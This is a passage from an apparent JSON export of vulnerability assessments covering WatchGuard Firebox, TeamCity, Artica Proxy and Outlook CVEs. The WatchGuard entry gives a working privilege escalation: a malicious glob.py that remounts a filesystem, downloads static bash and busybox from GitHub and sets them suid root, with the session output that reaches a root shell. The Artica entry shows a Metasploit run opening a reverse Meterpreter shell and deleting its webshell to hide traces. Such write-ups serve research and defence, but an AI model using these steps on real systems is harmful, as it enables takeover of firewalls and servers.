Cli Access:/etc/wg/admin-home:/usr/bin/cli\r\ndnswatchd:x:110:96:DNSWatch Service Daemon:/var/empty:\r\ntpagent:x:111:96:Tigerpaw Agent:/var/empty:\r\n\r\n>>> print(open(\"/etc/group\").read())\r\nadmin:x:0:0\r\nbin:x:1:admin,bin\r\nnobody:x:99:\r\nwgntp:x:98:\r\nopenvpn:x:97:\r\nwg:x:96:\r\nui:x:95:\r\nproxy:x:94:\r\nsshd:x:89:\r\nquagga:x:88:\r\nnetdbg:x:87:\r\ncwagent:x:100:\r\ndimension:x:101:\r\ntss:x:102:\r\natagent:x:103:\r\npsad:x:104:\r\nctlvpn:x:105:\r\ndnswatchd:x:107:\r\n\r\n>>> os.uname()\r\n('Linux', 'FireboxV', '4.14.83', '#1 SMP Mon Sep 27 17:48:07 PDT 2021', 'x86_64')\r\n>>>\r\n```\r\n### References\r\n[CVE-2022-26318](https://cve.mitre.org/cgi-bin/cvename.cgi?name=2022-26318)\r\n[Blind exploits to rule WatchGuard firewalls by Charles Fol](https://www.ambionics.io/blog/hacking-watchguard-firewalls)\r\n[Diving Deeper into WatchGuard Pre-Auth RCE - CVE-2022-26318](https://www.assetnote.io/resources/research/diving-deeper-into-watchguard-pre-auth-rce-cve-2022-26318)\r\n[Metasploit module PR 18915 ](https://github.com/rapid7/metasploit-framework/pull/18915)\r\n[WatchGuard XTM Firebox v12.7.2 download](https://cdn.watchguard.com/SoftwareCenter/Files/XTM/12_7_2/FireboxV_12_7_2.ova)\r\n\r\n### Credits\r\nCredits goes to `Charles Fol` of Ambionics Security  who discovered  this vulnerability.\r\nThe reverse engineering of this CVE was performed by `Dylan Pindur` from AssetNote.\r\n",
      "score": 2,
      "metadata": {
        "mitre-tactics": "Initial Access",
        "attacker-value": 5,
        "exploitability": 2
      },
      "tags": [
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "3e5a47c9-35b0-4d55-92e4-0e83e6cbb2ec",
          "name": "Difficult to weaponize",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "difficult_to_develop"
        }
      ]
    },
    {
      "id": "343cb821-e285-4854-8351-5429e90e1d73",
      "editorId": "d603b493-1c7b-4ee8-972f-185269cce6d3",
      "topicId": "7f1c8d00-ae08-447b-86b6-756b2e89da2b",
      "created": "2024-03-04T20:16:59.21787Z",
      "revisionDate": "2024-03-05T02:13:21.891579Z",
      "document": "CVE-2024-27199, allows for a limited amount of information disclosure and a limited amount of system modification, including the ability for an unauthenticated attacker to replace the HTTPS certificate in a vulnerable TeamCity server with a certificate of the attacker's choosing.",
      "score": 2,
      "metadata": {
        "attacker-value": 3,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "3a990b09-ee98-4f26-8bdb-8aaa27da4b44",
      "editorId": "d603b493-1c7b-4ee8-972f-185269cce6d3",
      "topicId": "272a41fd-6e6b-4bf6-8544-0481382e8b2b",
      "created": "2024-03-04T20:24:36.791304Z",
      "revisionDate": "2024-03-05T02:13:19.794101Z",
      "document": "CVE-2024-27198, allows for a complete compromise of a vulnerable TeamCity server by a remote unauthenticated attacker, including unauthenticated RCE. Compromising a TeamCity server allows an attacker full control over all TeamCity projects, builds, agents and artifacts, and as such is a suitable vector to position an attacker to perform a supply chain attack.",
      "score": 2,
      "metadata": {
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "514c3424-a21c-429d-999f-b5d46b0e3762",
      "editorId": "8a465efa-5959-4307-868a-5c6bd2f9fdc9",
      "topicId": "3379873d-095b-4ed3-a25e-de359b7e91d6",
      "created": "2024-03-07T19:38:10.228053Z",
      "revisionDate": "2024-03-21T11:23:20.718456Z",
      "document": "This journey starts when you have gained initial access to the WatchGuard FireBox firewall instance as described in this [attackerkb article](https://attackerkb.com/topics/t8Nrnu99ZE/cve-2022-26318).\r\nThe initial access is non privileged as user `nobody` and `/etc/fstab` shows that all filesystems are either protected with `read-only`, `no-suid` or `no-exec`.  Another interesting aspect is that there is no shell installed at all and the available unix binaries are very limited as well as `busybox` which only provides a very limited command set.  This makes `living off the land` pretty useless except for the `nmap` binary which is installed by default. \r\n```shell\r\nShell Banner:\r\nPython 2.7.14 (default, Oct 16 2019, 15:38:29)\r\n[GCC 6.5.0] on linux2\r\n-----\r\n\r\n>>> import os\r\n>>> os.getuid()\r\n99\r\n>>> os.getgid()\r\n96\r\n>>> import subprocess\r\n>>> print(open(\"/etc/fstab\").read())\r\n/dev/wgrd.sysa_code    /           ext2        ro,noatime              1 1\r\n/dev/wgrd.sysa_data    /etc/wg     ext3        rw,noexec,noatime       0 0\r\nnone                   /proc       proc        defaults                0 0\r\nnone                   /sys        sysfs       defaults                0 0\r\n/dev/wgrd.boot         /boot       ext2        ro,noexec,noatime       0 0\r\n/dev/wgrd.pending      /pending    ext2        rw,noexec,noatime       0 0\r\n/dev/wgrd.var          /var        ext2        rw,noexec,noatime       0 0\r\n\r\n# wg_linux platform.pkgspec\r\n\r\n>>> subprocess.call([\"nmap\", \"127.0.0.1\"])\r\nStarting Nmap 7.70 ( https://nmap.org ) at 2024-03-08 19:55 CET\r\nNmap scan report for localhost.localdomain (127.0.0.1)\r\nHost is up (0.0014s latency).\r\nNot shown: 990 closed ports\r\nPORT     STATE SERVICE\r\n80/tcp   open  http\r\n4125/tcp open  rww\r\n4126/tcp open  ddrepl\r\n5000/tcp open  upnp\r\n5001/tcp open  commplex-link\r\n5002/tcp open  rfe\r\n5003/tcp open  filemaker\r\n5004/tcp open  avt-profile-1\r\n6001/tcp open  X11:1\r\n8080/tcp open  http-proxy\r\n\r\nNmap done: 1 IP address (1 host up) scanned in 0.24 seconds\r\n0\r\n>>>\r\n```\r\nSo the big question, how do we get privileged access?\r\nLuckily, the appliance has `python` installed and this heavily used by a lot of specific binaries for WatchGuard. One of those binaries is the `/usr/bin/fault_rep` program, that generates  a crash report whenever a program crashes. And it has  the `setuid` bit set on user root.\r\n```shell\r\n>>> subprocess.call([\"ls\", \"-l\", \"/usr/bin/fault_rep\"])\r\n-rwsr-xr-x    1 root     admin        31424 Sep 28  2021 /usr/bin/fault_rep\r\n0\r\n>>>\r\n```\r\nHaving a closer look at the binary, it internally calls `/usr/bin/diag_snapgen`, a python program. Here are lines of the program:\r\n```shell\r\n>>> print(open(\"/usr/bin/diag_snapgen\").read())\r\n#!/usr/bin/python\r\n\r\n#\r\n# Diagnostic Snapshot Generator\r\n#\r\n# This script runs when a fault triggers through the Fault Reporting System.\r\n#\r\n\r\nimport subprocess\r\nimport glob\r\n\r\n#\r\n# These files will have their contents copied into the diagnostic snapshot\r\n# file.  Add (or subtract!) from this list at will.\r\n#\r\nFILES = [\r\n    '/etc/wg/bootlog',\r\n    '/var/log/*.log',\r\n    '/var/log/trace/*.log',\r\n    '/proc/interrupts',\r\n    '/proc/meminfo'\r\n]\r\n\r\n#\r\n# These programs will have their output copied into the diagnostic snapshot\r\n# file.  Add (or subtract!) from this list at will.\r\n#\r\nPROGRAMS = [\r\n    '/bin/ps',\r\n    '/bin/ls -l /tmp',\r\n    '/bin/df',\r\n    '/bin/dmesg'\r\n]\r\n\r\n#\r\n# Diagnostic Snapshot Generation\r\n#\r\n\r\nfor i, path in enumerate(FILES):\r\n    for j, name in enumerate(glob.glob(path)):\r\n        print \"=== %s ===\" % (name)\r\n        try:\r\n            f = open(name)\r\n            for line in f:\r\n                print line,\r\n\r\n            f.close()\r\n        except:\r\n            print \"(Unable to open file!)\"\r\n        print\r\n\r\nfor i, name in enumerate(PROGRAMS):\r\n    print \"=== %s ===\" % (name)\r\n    try:\r\n        name = name.split()\r\n        p = subprocess.Popen(name, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\r\n        out, err = p.communicate()\r\n        if p.returncode:\r\n            raise(Exception(err))\r\n        print out\r\n    except:\r\n        print \"(Unable to run command!)\"\r\n    print\r\n\r\n>>>\r\n```\r\nThis is pretty promising because `glob.py`, which is imported, can be easily exchanged by a malicious program with the same name. This will run under root context.\r\n\r\nSo let's think this thru...\r\n* We create a malicious `glob.py` where we can run python code under the context of root.\r\n* This python code should remount a filesystem with `exec` and `read-write` rights.\r\n* A good candidate is the `/dev/wgrd.pending` filesystem.\r\n* We can download a static linked `bash` and `busybox` x86-64 binary from the web.\r\n* Change the ownership to `root.admin` and set the `suid` and `sgid` bit on both binaries.\r\n* We should now be able to spin off a root shell that gives us full control on the appliance.\r\n\r\nThis sounds like a plan...\r\nHere is malicious `glob.py` code.\r\n```python\r\nimport subprocess, os, requests, ctypes\r\n# set root\r\nos.setuid(0)\r\nos.setgid(0)\r\n\r\n# remount /pending directory to enable suid and execution\r\ndef mount(source, target, fs, options='', flags=0):\r\n  ret = ctypes.CDLL('libc.so.6', use_errno=True).mount(source, target, fs, flags, options)\r\n  if ret < 0:\r\n    errno = ctypes.get_errno()\r\n    raise RuntimeError(\"Error mounting {} ({}) on {} with options '{}': {}\".format(source, fs, target, options, os.strerror(errno)))\r\n\r\n# 32 -- MS_REMOUNT flag\r\nmount('/dev/wgrd.pending', '/pending', 'ext2', 0, 32)\r\n\r\n# get the bash static x86_64 binary\r\nresponse = requests.get(\"https://github.com/ryanwoodsmall/static-binaries/raw/master/x86_64/bash\", verify=False)\r\nwith open(\"/pending/tmp/bash\", mode=\"wb\") as file:\r\n\tfile.write(response.content)\r\n\r\n# get busybox static x86_64 binary\r\nresponse = requests.get(\"https://github.com/ryanwoodsmall/static-binaries/raw/master/x86_64/busybox\", verify=False)\r\nwith open(\"/pending/tmp/busybox\", mode=\"wb\") as file:\r\n\tfile.write(response.content)\r\n\r\n# setuid and sgid bit and make world executable. Bingo, you are root now!\r\nos.chown(\"/pending/tmp/bash\", 0, 0)\r\nos.chmod(\"/pending/tmp/bash\", 0o6755)\r\nos.chown(\"/pending/tmp/busybox\", 0, 0)\r\nos.chmod(\"/pending/tmp/busybox\", 0o6755)\r\nexit()\r\n```\r\nOk, let's test this...\r\nWe will first upload our malicious `glob.py` to `/tmp` which is by default read-write, however we can not run any binaries in `/tmp` except for python scripts. But that is anyhow all we need...\r\nTo ensure that our malicious `glob.py` gets imported, we need to change the `PYTHONPATH` to `/tmp` or `. `.\r\nWe than call our root `suid` program `/usr/bin/fault_rep` and our malicious `glob.py` should do the magic.\r\n```shell\r\n>>> import requests\r\n>>> response = requests.get(\"http://192.168.201.8:1980/glob.py\")\r\n>>> with open(\"/tmp/glob.py\", mode=\"w\") as file:\r\n... \tfile.write(response.content)\r\n...\r\n>>> subprocess.call([\"ls\", \"-l\", \"/tmp/glob.py\"])\r\n-rw-r--r--    1 nobody   wg            1364 Mar  8 17:03 /tmp/glob.py\r\n0\r\n>>>\r\n```\r\nOk, we have successfully downloaded `glob.py`. Please ensure that you have a `http` server running on your attacker machine.\r\nNext step is to set the `PYTHONPATH` and run `/usr/bin/fault_rep`.\r\n```shell\r\n>>> myenv = os.environ.copy()\r\n>>> myenv['PYTHONPATH'] = '.'\r\n>>> print(myenv)\r\n{'PYTHONPATH': '.'}\r\n>>> subprocess.check_call([\"/usr/bin/fault_rep\", \"-r\", \"'a'\", \"-c1\", \"-v\"], env=myenv)\r\ngenerating fault [01/unspecified] (Failed Assertion)...\r\n0\r\n>>>\r\n```\r\nLet's check if the binaries are downloaded in `/pending/tmp` directory and owned by `root.admin` with `suid` and `sgid` bit set.\r\n```shell\r\n>>> subprocess.call([\"ls\", \"-l\", \"/pending/tmp\"])\r\n-rwsr-sr-x    1 root     admin      2772944 Mar  8 17:14 bash\r\n-rwsr-sr-x    1 root     admin      1894248 Mar  8 17:14 busybox\r\nsrw-r-----    1 nobody   nobody           0 Mar  7 22:38 cgi\r\n-rw-r--r--    1 root     admin            0 Mar  8 16:37 configd.log\r\nsrw-rw-rw-    1 nobody   wg               0 Mar  7 22:38 epm\r\nsrw-rw-rw-    1 root     admin            0 Mar  7 22:38 geolocation\r\n-rw-r--r--    1 nobody   wg            1364 Mar  8 17:00 glob.py\r\nprw-------    1 nobody   wg               0 Mar  7 22:38 radiusd\r\nprw-------    1 nobody   wg               0 Mar  7 22:38 rsso-auth\r\nsrwxr-xr-x    1 nobody   admin            0 Mar  7 22:38 webui\r\nsrw-rw-rw-    1 nobody   wg               0 Mar  8 16:00 wgagent\r\n0\r\n>>>\r\n```\r\nCool, the trick worked!\r\nLet's get our `bash` root shell...\r\n```shell\r\n>>> subprocess.call([\"/pending/tmp/bash\", \"-i\"])\r\nbash: cannot set terminal process group (11397): Not a tty\r\nbash: no job control in this shell\r\nbash-5.2$ /pending/tmp/busybox id\r\n/pending/tmp/busybox id\r\nuid=99(nobody) gid=96(wg)\r\nbash-5.2$\r\n```\r\nMmm, that's strange. Looks that `suid` is not working.\r\nAhh, this rings a bell. Set `suid` bit on a `bash` shell does not work out of the box. There is `-p` option that overrides this behavior.\r\n```shell\r\nbash-5.2# >>> subprocess.call([\"/pending/tmp/bash\", \"-i\", \"-p\"])\r\nbash: cannot set terminal process group (11397): Not a tty\r\nbash: no job control in this shell\r\nbash-5.2# /pending/tmp/busybox id\r\n/pending/tmp/busybox id\r\nuid=99(nobody) gid=96(wg)\r\n```\r\nWe got a root prompt, but we are still not there with full root access.\r\nLet's start a python session in this shell and set the `suid` and `sgid` once more and launch the `bash` shell again.\r\n```shell\r\nbash-5.2# python -i\r\npython -i\r\nPython 2.7.14 (default, Oct 16 2019, 15:38:29)\r\n[GCC 6.5.0] on linux2\r\nType \"help\", \"copyright\", \"credits\" or \"license\" for more information.\r\n>>> import os\r\n>>> os.setuid(0)\r\n>>> os.setgid(0)\r\n>>> import subprocess\r\n>>> subprocess.call([\"/pending/tmp/bash\", \"-i\"])\r\nbash: cannot set terminal process group (12299): Not a tty\r\nbash: no job control in this shell\r\nbash-5.2# /pending/tmp/busybox id\r\n/pending/tmp/busybox id\r\nuid=0(root) gid=0(admin)\r\nbash-5.2#\r\n```\r\nHere we go!\r\nWe have full root access now.\r\n\r\n### References\r\n[CVE-2022-31791](https://cve.mitre.org/cgi-bin/cvename.cgi?name=2022-31791)\r\n[Blind exploits to rule WatchGuard firewalls by Charles Fol](https://www.ambionics.io/blog/hacking-watchguard-firewalls)\r\n[Metasploit module PR 18915 ](https://github.com/rapid7/metasploit-framework/pull/18915)\r\n[WatchGuard XTM Firebox v12.7.2 download](https://cdn.watchguard.com/SoftwareCenter/Files/XTM/12_7_2/FireboxV_12_7_2.ova)\r\n\r\n### Credits\r\nCredits goes to `Charles Fol` of Ambionics Security  who discovered  this vulnerability.\r\n\r\n",
      "score": 3,
      "metadata": {
        "mitre-tactics": "Credential Access",
        "attacker-value": 5,
        "exploitability": 4
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "b65c2492-bb05-477a-86bb-0c9569f80141",
          "name": "Authenticated",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "post_auth"
        }
      ]
    },
    {
      "id": "e73cbea0-774c-46e7-bf40-d0a988c026f6",
      "editorId": "8a465efa-5959-4307-868a-5c6bd2f9fdc9",
      "topicId": "8f550e9a-af4e-4545-ab8f-7a3999e6cad9",
      "created": "2024-03-15T18:20:23.937545Z",
      "revisionDate": "2024-03-30T19:58:21.597082Z",
      "document": "One of the common vulnerabilities that is still around and pretty common nowadays is the Deserialization of Untrusted Data (`DUD`). \r\n`DUD` is a vulnerability that can occur in software systems that use serialization and deserialization. Serialization is the process of converting an object\u2019s state to a stream of bytes, while deserialization is the process of recreating the object from the stream of bytes. \r\n\r\nThis is typically used to exchange information between systems. Distributed systems often share objects across separate nodes, so objects must be delivered over the wire. Since objects tend to consist of many parts, it can be time-consuming to write code that handles the delivery of each individual part. Serialization enables us to save and transmit the state of an object in a standardized way. Deserialization then enables us to recreate objects after they have been serialized for transmission over the wire, between applications, through firewalls, and more.\r\n\r\nIn a system that uses `DUD`, untrusted data, such as data received from an external source, is deserialized without proper validation. This can allow an attacker to inject malicious data into the system, potentially leading to security vulnerabilities such as remote code execution, unauthorized access to sensitive data, or other malicious actions (see also [MITRE CWE-502: Deserialization of Untrusted Data](https://cwe.mitre.org/data/definitions/502.html) or [OWASP CWE-502: Deserialization of Untrusted Data](https://owasp.org/www-community/vulnerabilities/Deserialization_of_untrusted_data)).\r\n\r\nAnd this vulnerability is one of the many that we see nowadays. Korelogic discovered a `DUD` in Artica Proxy `4.50` and `4.40` in `wiz.wizard.progress.php` where prior to authentication, a user can send an HTTP request to the `/wizard/wiz.wizard.progress.php` endpoint. This endpoint processes the `build-js` query parameter by base64 decoding the provided value without checking the data and then calling the `unserialize` PHP function with the decoded value as input. More technical details can be found in the [Korelogic Advisory KL-001-2024-002](https://korelogic.com/Resources/Advisories/KL-001-2024-002.txt).\r\n\r\nI have created a Metasploit module that will exploit this vulnerability. I did make some enhancements compared to the POC that Korelogic published. For instance, I am not overwriting the file `/usr/share/artica-postfix/wizard/wiz.upload.php` but creating a randomized  PHP file to trigger the remote code execution which is removed automatically after successful exploitation to cover our tracks.\r\n\r\n### Module Details\r\n```msf\r\nmsf6 exploit(linux/http/artica_proxy_unauth_rce_cve_2024_2054) > info\r\n\r\n       Name: Artica Proxy Unauthenticated PHP Deserialization Vulnerability\r\n     Module: exploit/linux/http/artica_proxy_unauth_rce_cve_2024_2054\r\n   Platform: PHP, Unix, Linux\r\n       Arch: php, cmd, x64, x86\r\n Privileged: No\r\n    License: Metasploit Framework License (BSD)\r\n       Rank: Excellent\r\n  Disclosed: 2024-03-05\r\n\r\nProvided by:\r\n  h00die-gr3y <h00die.gr3y@gmail.com>\r\n  Jaggar Henry of KoreLogic Inc.\r\n\r\nModule side effects:\r\n ioc-in-logs\r\n artifacts-on-disk\r\n\r\nModule stability:\r\n crash-safe\r\n\r\nModule reliability:\r\n repeatable-session\r\n\r\nAvailable targets:\r\n      Id  Name\r\n      --  ----\r\n  =>  0   PHP\r\n      1   Unix Command\r\n      2   Linux Dropper\r\n\r\nCheck supported:\r\n  Yes\r\n\r\nBasic options:\r\n  Name       Current Setting  Required  Description\r\n  ----       ---------------  --------  -----------\r\n  Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]\r\n  RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/ba\r\n                                        sics/using-metasploit.html\r\n  RPORT      9000             yes       The target port (TCP)\r\n  SSL        true             no        Negotiate SSL/TLS for outgoing connections\r\n  SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)\r\n  TARGETURI  /                yes       The Artica Proxy endpoint URL\r\n  URIPATH                     no        The URI to use for this exploit (default is random)\r\n  VHOST                       no        HTTP server virtual host\r\n  WEBSHELL                    no        Set webshell name without extension. Name will be randomly generated if left un\r\n                                        set.\r\n\r\n\r\n  When CMDSTAGER::FLAVOR is one of auto,tftp,wget,curl,fetch,lwprequest,psh_invokewebrequest,ftp_http:\r\n\r\n  Name     Current Setting  Required  Description\r\n  ----     ---------------  --------  -----------\r\n  SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. This must be an address on t\r\n                                      he local machine or 0.0.0.0 to listen on all addresses.\r\n  SRVPORT  1981             yes       The local port to listen on.\r\n\r\n\r\n  When TARGET is not 0:\r\n\r\n  Name     Current Setting  Required  Description\r\n  ----     ---------------  --------  -----------\r\n  COMMAND  passthru         yes       Use PHP command function (Accepted: passthru, shell_exec, system, exec)\r\n\r\nPayload information:\r\n\r\nDescription:\r\n  A Command Injection vulnerability in Artica Proxy appliance 4.50 and below allows\r\n  remote attackers to run arbitrary commands via unauthenticated HTTP request.\r\n  The Artica Proxy administrative web application will deserialize arbitrary PHP objects\r\n  supplied by unauthenticated users and subsequently enable code execution as the \"www-data\" user.\r\n\r\nReferences:\r\n  https://nvd.nist.gov/vuln/detail/CVE-2024-2054\r\n  https://attackerkb.com/topics/q1JUcEJjXZ/cve-2024-2054\r\n  https://packetstormsecurity.com/files/177482\r\n\r\n\r\nView the full module info with the info -d command.\r\n```\r\n**Target 0 - PHP native `php/meterpreter/reverse_tcp` session**\r\n```msf\r\nmsf6 exploit(linux/http/artica_proxy_unauth_rce_cve_2024_2054) > set webshell cuckoo\r\nwebshell => cuckoo\r\nmsf6 exploit(linux/http/artica_proxy_unauth_rce_cve_2024_2054) > set target 0\r\ntarget => 0\r\nmsf6 exploit(linux/http/artica_proxy_unauth_rce_cve_2024_2054) > set rhosts 192.168.201.4\r\nrhosts => 192.168.201.4\r\nmsf6 exploit(linux/http/artica_proxy_unauth_rce_cve_2024_2054) > set lhost 192.168.201.8\r\nlhost => 192.168.201.8\r\nmsf6 exploit(linux/http/artica_proxy_unauth_rce_cve_2024_2054) > exploit\r\n\r\n[*] Started reverse TCP handler on 192.168.201.8:4444\r\n[*] Running automatic check (\"set AutoCheck false\" to disable)\r\n[*] Checking if 192.168.201.4:9000 can be exploited.\r\n[+] The target is vulnerable. Artica version: 4.50\r\n[*] Executing PHP for php/meterpreter/reverse_tcp\r\n[*] Sending stage (39927 bytes) to 192.168.201.4\r\n[+] Deleted /usr/share/artica-postfix/wizard/cuckoo.php\r\n[*] Meterpreter session 15 opened (192.168.201.8:4444 -> 192.168.201.4:33986) at 2024-03-15 17:46:04 +0000\r\n\r\nmeterpreter > sysinfo\r\nComputer    : artica-applianc\r\nOS          : Linux artica-applianc 4.19.0-24-amd64 #1 SMP Debian 4.19.282-1 (2023-04-29) x86_64\r\nMeterpreter : php/linux\r\nmeterpreter > getuid\r\nServer username: www-data\r\nmeterpreter >\r\n```\r\n\r\n## Mitigation\r\nIf you want to test the module, you can download a vulnerable Artica Proxy appliance from [here](https://sourceforge.net/projects/artica-squid/files/ISO/). You are strongly advised to upgrade your appliance to the latest version, but at least to a version greater then `4.50`.  Another quick fix is to remove the `/usr/share/artica-postfix/wizard` directory if it is not needed.\r\n\r\n## References\r\n[CVE-2024-2054](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-2054)\r\n[Korelogic Advisory KL-001-2024-002](https://korelogic.com/Resources/Advisories/KL-001-2024-002.txt)\r\n[MITRE CWE-502: Deserialization of Untrusted Data](https://cwe.mitre.org/data/definitions/502.html)\r\n[OWASP CWE-502: Deserialization of Untrusted Data](https://owasp.org/www-community/vulnerabilities/Deserialization_of_untrusted_data)\r\n[Artica Proxy Appliance ISO Downloads](https://sourceforge.net/projects/artica-squid/files/ISO/)\r\n[Metasploit PR 18967: Artica Proxy unauthenticated RCE] (https://github.com/rapid7/metasploit-framework/pull/18967)\r\n\r\n### Credits\r\nCredits goes to the security researcher below who discovered this vulnerability\r\n* `Jaggar Henry of KoreLogic Inc.`\r\n",
      "score": 2,
      "metadata": {
        "mitre-tactics": "Execution",
        "attacker-value": 5,
        "exploitability": 4
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "fe6b7788-e442-4032-883f-8fb416a4f8b1",
      "editorId": "198da8db-21b5-4678-a70d-51ae5c950847",
      "topicId": "2f458d3b-6303-447c-bba5-bf72cf3f57d1",
      "created": "2024-03-20T10:13:25.659883Z",
      "revisionDate": "2024-03-22T23:26:18.239949Z",
      "document": "### Vulnerable software:\r\n```\r\nAbout Outlook Version:\r\nYou have Microsoft Outlook Version 1.2024.313.100 (Production).\r\nClient Version is 20240308003.16 \r\n```\r\n### Description:\r\nBy sending a malicious (.docm) file, to the victim using the Outlook mail \u2013 app of 365, the attacker will wait for the victim to click on it by using and executing his malicious code after the victim opens this file. After this action, the attacker can get control of some parts of the Windows services, he can steal sensitive information, and make a bot machine from the victim\u2019s PC. It depends on the victim's privileges, and what the attacker wants to do with him, this exploit may destroy completely the victim's machine!\r\n\r\nDemo: [YouTube](https://www.youtube.com/watch?v=7gNq2sxh9J0)\r\nm0r3:[m0r3](https://www.youtube.com/watch?v=zxrlV8lgoB0)\r\nGit:[GitHub](https://github.com/nu11secur1ty/CVE-mitre/tree/main/2024/CVE-2024-21413)",
      "score": 1,
      "metadata": {
        "mitre-tactics": "Execution",
        "attacker-value": 3,
        "exploitability": 3
      },
      "tags": [
        {
          "id": "1a4228a8-bc05-41a0-a7ee-43d4fa7e381e",
          "name": "Difficult to patch",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "difficult_to_patch"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "def6357c-0771-400a-909d-2021d9f6b227",
          "name": "Observed in ransomware attacks",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "observed_in_ransomware"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "01c67142-c23f-4ee7-8803-49d10d588299",
          "name": "Requires user interaction",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "requires_interaction"
        },
        {
          "id": "795f5056-8a39-4610-912c-c033bd6fd4cb",
          "name": "Vulnerable in uncommon configuration",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "obscure_configuration"
        }
      ]
    },
    {
      "id": "bd0a0b70-bf0b-4079-a334-c636135a39cc",
      "editorId": "e28f53e6-cf6f-4b91-89be-6cb19dfd4315",
      "topicId": "c308da96-54ec-450f-8416-91e1305968e3",
      "created": "2024-03-21T20:18:45.146644Z",
      "revisionDate": "2024-07-29T07:43:33.144947Z",
      "document": "This CVE has been observed being abused by the Medusa Ransomware group",
      "score": 0,
      "metadata": {
        "attacker-value": 5,
        "exploitability": 4
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "791283de-d643-4ede-850e-91a6edb897db",
          "name": "Exploited in the wild",
          "type": "exploited_in_the_wild",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "exploited_in_the_wild"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "def6357c-0771-400a-909d-2021d9f6b227",
          "name": "Observed in ransomware attacks",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "observed_in_ransomware"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        }
      ]
    },
    {
      "id": "eb1a9fc0-e1ae-4953-88b8-541a251a0263",
